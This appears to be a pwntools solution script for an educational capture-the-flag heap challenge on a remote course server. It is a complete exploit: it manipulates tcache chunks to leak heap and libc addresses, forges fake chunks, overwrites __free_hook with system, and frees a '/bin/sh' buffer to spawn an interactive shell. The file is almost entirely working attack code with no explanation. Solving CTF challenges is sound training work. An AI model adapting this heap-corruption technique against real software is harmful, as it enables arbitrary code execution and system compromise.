from pwn import *

context.arch = 'amd64'
r = remote('edu-ctf.zoolab.org', 10015)
#r = process('share/chal')

def add(index):
    print(r.recvuntil(b'> '))
    r.sendline(str(1).encode())
    print(r.recvuntil(b'> ')) # index
    r.sendline(str(index).encode())

def edit(index, size, data):
    print(r.recvuntil(b'> '))
    r.sendline(str(2).encode())
    print(r.recvuntil(b'> ')) # index
    r.sendline(str(index).encode())
    print(r.recvuntil(b'> ')) # size
    r.sendline(str(size).encode())
    r.send(data)

def delete(index):
    print(r.recvuntil(b'> '))
    r.sendline(str(3).encode())
    print(r.recvuntil(b'> ')) # index
    r.sendline(str(index).encode())

for i in range(8):
    add(i)
edit(7, 0x18, b'aaaaaaaabbbbbbbb')
add(8)

for i in range(7):
    delete(i)
delete(8)
delete(7)


for i in range(10):
    add(i)
delete(8)
delete(9)

# show
print(r.recvuntil(b'> '))
r.sendline(str(4).encode())
print(r.recvuntil(b'[7] '))
heap_addr = u64(r.recv(6).ljust(8, b'\x00'))
print('Heap addr: ', hex(heap_addr))

add(8)
add(9)
edit(8, 0x78, b'hello8')
edit(0, 0x78, b'hello0')
edit(1, 0x78, b'hello1')
edit(2, 0x78, b'hello2')
edit(3, 0x78, b'hello3')
edit(4, 0x78, b'hello4')
edit(5, 0x78, b'hello5')
edit(6, 0x78, b'hello6')
edit(9, 0x18, b'hello9')
add(10)

fake_chunk = flat(
    0x4000, heap_addr + 0x20,
    0, 0x21,
    0, 0,
    0, 0x421
)
edit(7, 0x40, fake_chunk)

delete(8)
add(8)
fake_chunk = flat(
    0x4000, heap_addr + 0x20,
)
edit(7, 0x10, fake_chunk)

# show
print(r.recvuntil(b'> '))
r.sendline(str(4).encode())
print(r.recvuntil(b'[8] '))
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ECBE0
free_hook = libc + 0x1eee48
system = libc + 0x52290
print('libc: ', hex(libc))

fake_chunk = flat(
    0x4000, free_hook,
)
edit(7, 0x10, fake_chunk)
edit(8, 0x10, p64(system))
add(11)
edit(11, 0x8, b'/bin/sh\x00')
delete(11)

#gdb.attach(r)
r.interactive()